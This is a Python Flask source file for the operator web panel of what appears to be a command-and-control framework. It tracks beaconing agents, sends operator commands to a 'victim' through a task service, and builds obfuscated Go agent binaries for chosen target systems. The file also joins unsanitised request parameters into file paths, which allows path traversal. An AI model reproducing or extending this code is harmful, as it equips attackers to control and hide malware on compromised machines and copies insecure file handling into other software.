from flask import Blueprint
from flask import request
from requests import post
import json
import glob

import os

from ..console import Color
import pilotica.agentlab as al

from .database import *
from .transport import Transport
from .operators import OperatorRoles

from flask import render_template, redirect, url_for, flash
from flask_login import login_required, current_user
from datetime import datetime

from werkzeug.security import generate_password_hash

# Webinterface
webinterface = Blueprint("webinterface", __name__, url_prefix="/interface")

@webinterface.route("")
@webinterface.route("/")
def interface():
    return redirect(url_for('webinterface.dashboard'))

@webinterface.route("/agents", methods = {'GET'})
@login_required
def agents():
    agents: list[Agent] = Agent.query.all()
    return render_template("agents.html.j2",
            agents=[agent.jsonify(asDict=True) for agent in agents],
            Transport=Transport, 
            current_operator=current_user)

@webinterface.route("/operators/new", methods = {'POST'})
@login_required
def new_operator():
    pwd1 = request.form.get('password1')
    pwd2 = request.form.get('password2')
    if pwd1 == pwd2:
        pwd_hash = generate_password_hash(pwd1)
        new_operator = Operator(name=request.form.get('name'), pwd_hash=pwd_hash, role=request.form.get('role'))

        db.session.add(new_operator)
        db.session.commit()

        flash("Added new Operator!", 'success')
    else:
        flash("Passwords dont match!", 'danger')
    return redirect(url_for('webinterface.operators'))

@webinterface.route("/dashboard")
@login_required
def dashboard():
    def percentage(part, whole):
        if part == 0:
            return 0
        return int(100 * float(part)/float(whole))

    agents: list[Agent]       = Agent.query.all()
    online: list[Agent]       = []
    for agent in agents:
        delta = datetime.utcnow() - agent.beacon
        if delta.seconds <= 60:
            online.append(agent)
    
    tasks: list[Tasks]        = Task.query.all()
    finished: list[Tasks]     = Task.query.filter_by(fired=True).all()
    mytasks: list[Tasks]      = Task.query.filter_by(operator = current_user.name).all()
    myfinished: list[Tasks]      = Task.query.filter_by(operator = current_user.name).filter_by(fired=True).all()
    operators: list[Operator] = Operator.query.all()

    return render_template("dashboard.html.j2",
        agent_count=len(agents),
        online_average=percentage(len(online), len(agents)),
        task_count=len(tasks),
        finished_average=percentage(len(finished), len(tasks)),
        mytask_count=len(mytasks),
        myfinished_average=percentage(len(myfinished), len(mytasks)),
        operator_count=len(operators),
        current_operator=current_user
    )

@webinterface.route("/operators/edit", methods = {'POST'})
@login_required
def edit_operator():
    failed = False
    id = int(request.form.get('id'))
    if Operator.exists(id=id):
        operator = Operator.query.filter_by(id=id).first()
        new_pwd = bool(request.form.get('changePwd'))
        if new_pwd:
            pwd1 = request.form.get('password1')
            pwd2 = request.form.get('password2')
            if pwd1 == pwd2:
                operator.pwd_hash = generate_password_hash(pwd1)
            else:
                flash("Passwords dont match!", 'danger')
                failed = True
        if not failed:
            operator.name = request.form.get('name')
            if id != current_user.id:
                operator.role = request.form.get('role')

            db.session.commit()
            flash("Saved Operator Settings!", 'success')
    else:
        flash("Operator dose not exist!", 'danger')
    
    return redirect(url_for('webinterface.operators'))

@webinterface.route("/operators", methods = {'GET'})
@login_required
def operators():    
    if current_user.role == OperatorRoles.ADMIN.get('name'):
        operators: list[Operator] = Operator.query.all()
        return render_template('operators.html.j2' ,
                operators=[operator.jsonify(asDict=True) for operator in operators],
                Transport=Transport, 
                current_operator=current_user)
    else:
        flash("You don't have have the right permissions!", 'danger')
        return redirect(url_for('webinterface.agents'))

@webinterface.route("/get_values", methods={'GET'})
@login_required
def get_values():
    from ..settings import instance_path
    src = os.path.join(instance_path, "agentlab", request.args.get('name'))
    return json.dumps(al.get_values(src))

@webinterface.route("/agentlab", methods={"GET"})
@login_required
def agentlab():
    from ..settings import instance_path
    path = os.path.join(instance_path, "agentlab", "build")
    if not os.path.exists(path):
        os.mkdir(path)

    binarys = os.listdir(path)
    enumBin = enumerate(binarys)
    if len(binarys) < 1:
        enumBin = list()
    return render_template("agentlab.html.j2", binarys=enumBin, current_operator=current_user)
    

@webinterface.route("/builder", methods={"POST", "GET"})
@login_required
def builder():
    from ..settings import instance_path, str2bool
    if request.method == "GET":
        if current_user.role in [OperatorRoles.ADMIN["name"], OperatorRoles.OPERATOR["name"]]:
            path = os.path.join(instance_path, "agentlab")
            files = os.listdir(path)
            sources = list()
            for file in files:
                if file.endswith('.go'):
                    sources.append(file)
            sources = enumerate(sources)
            return render_template('builder.html.j2', sources=sources, current_operator=current_user)
        else:
            flash("You don't have have the right permissions!", 'danger')
            return redirect(url_for('webinterface.agents'))
    else:
        src = os.path.join(instance_path, "agentlab", request.form.get('src'))
        out = os.path.join(instance_path, "agentlab", "build", request.form.get('name'))
        target_os = request.form.get('target_os')
        obfuscate = str2bool(request.form.get('obfuscate'))

        al.downoad_latest_go()
        print()
        al.download_obfuscator()

        print()
        values = None
        keys = al.get_values(src).keys()
        if len(keys) > 0:
            values = dict()
            for key in keys:
                v = request.form.get(key)
                if v:
                    values[key] = v

        if al.compile_go(src, out, obfuscate, target_os, values):
            flash("Agent Compiled successfilly and is ready for download!", 'primary')
        else:
            flash("Agent Compilation Failed, please contact the server admin!", 'danger')

        return redirect(url_for('webinterface.agentlab'))

@webinterface.route("/<string:agent_uuid>/console", methods={"POST", "GET"})
@login_required
def agent_console(agent_uuid):
    from ..settings import secret_key
    if request.method == "GET":
        tasks = [task.jsonify(True) for task in Agent.get_by_uuid(agent_uuid).tasks]
        return render_template("console.html.j2", uuid=agent_uuid, tasks=tasks, current_operator=current_user, secret_key=secret_key)
    else:
        command = request.form.get("command")
        args    = request.form.get("args")
        victim  = request.form.get("victim")
        delay   = request.form.get("delay")
        
        body = {
            "uuid": agent_uuid,
            "task": {  
                "command": command,
                "args": args,
                "victim": victim,
                "operator": current_user.name,
                "delay": delay,
                "execTime": 0,
                "file": "",
                "usesmb": "",
                "actsmb": ""
            }
        }
        resp = Transport(post(url_for("service.task", _external=True), json=Transport(json.dumps(body), "out"), headers={"key": secret_key}).text, "in")
        if resp == "FAILED":
            flash("Could not add new Task!", "danger")
        return redirect(url_for("webinterface.agent_console", agent_uuid=agent_uuid))